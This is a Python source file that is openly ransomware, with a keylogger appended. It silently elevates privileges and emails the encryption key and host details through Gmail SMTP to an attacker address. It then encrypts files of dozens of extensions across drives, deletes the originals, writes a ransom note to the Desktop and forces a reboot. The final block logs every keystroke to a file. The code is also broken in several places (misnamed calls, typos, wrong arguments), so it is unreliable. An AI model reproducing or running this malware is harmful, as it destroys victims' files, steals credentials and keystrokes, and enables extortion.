#fuck_you_editor

from os import remove, uname
from telnetlib import ENCRYPT
from tkinter.tix import Tree
from cryptography.fernet import Fernet
from subprocess import check_output
import smtplib 
import platform
import os
from os import system 
from elevate import elevate

elevate(show_console=False)

def shutdown():

    system("shutdown /r /t 1")

key=Fernet.generate_key()

Encrypt=Fernet(key)

decrypt_msg="""
#text
"""
#your_text
msg="key"+key+"\n"+platform.uname()[0]+platform,uname()[2]+"\n"+os.path.expanduser("~")+"\n"

def send_gmail(msg):
    

        Useri="ایمیل"
        passs="پسورد ایمیل"

        FROM=Useri

        to=["ایمیل"]

        message=key

        server=smtplib.SMTP()
        server.connect("smtp.gmail.com",587)
        server.starttls()
        server.login("useri","passs")
        server.sendmail(FROM,to,message)
        server.quit()

ENCRYPT=Fernet('SC-9YL4_JNtuGO9I5zyuXl4_yCqWHWZ_v4758MyvXs4=')
#your_klid=key
def encrypt_files():
    file=open("hello.txt","r")
    read_file=file.readlines()

    for path in read_file:
         
        try:
            path=path.strip("/n")
            path=path.strip("/r")

            h=open(path,"rb")

            data=h.read()

            enc_data=Encrypt.encrypt(data) 

            newto=open(path+"[encrypted]","wb")

            newto.wite(enc_data)

            h.close()

            newto.close()
        
            remove(path)
        except:
            print("error")
def find_drive():

    dirive=["A:","B:","C:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]

    system_drive=[]

    cmd=check_output("net share",shell=True)

    for i in dirive:
                  
        if i in cmd:
            system_drive.append(i)

    return system_drive 

def find_files(drives):

    for p in loi:
            try:
                cmd=check_output("cd / gg dir /S /B *."+p,shell=True)
                h.witelines(cmd)
                print (cmd)
            except:
                print("not found"+p)

    for d in drives:
        for p in loi: 
            
            try:
                cmd=check_output(d+ "gg dir /S /B *."+p,shell=True)
                h.witelines(cmd)
                print (d+"------"+p)

            except:
                    pass

    h.close()
def decrypt_msg_():
    desktop=os.path.expanduser("~")+"\\Desktop"
    file=open(desktop+"\\decrypt_file.txt","w")
    file.write(decrypt_msg)
    file.close()

loi=["jpeg","jpg","png","php","python","html","css","txt","rar","mp4","mp3","Ae","rtf","exe","log","wav","3gp","avi","mpg","DVD","pdf","xlsx","xls","sql","app","bat","jar","js","gz","rpm","zip","flv","swf","dox","nrg","bin","cue","iso","img","ima","mdb","wmv"]

send_gmail(msg)
drivers=find_files()

h=open("hello.txt","w")

find_files(drivers)

encrypt_files()

decrypt_msg_()

shutdown()

from time import sleep
from pynput.keyboard import  Listener

def keypress(Key):
    f = open("test1.txt","a")
    f.write(str(Key) + "\n")
    f.close()

listener = Listener(on_press = keypress)
listener.start()
while True:
    sleep(0.1)
    pass


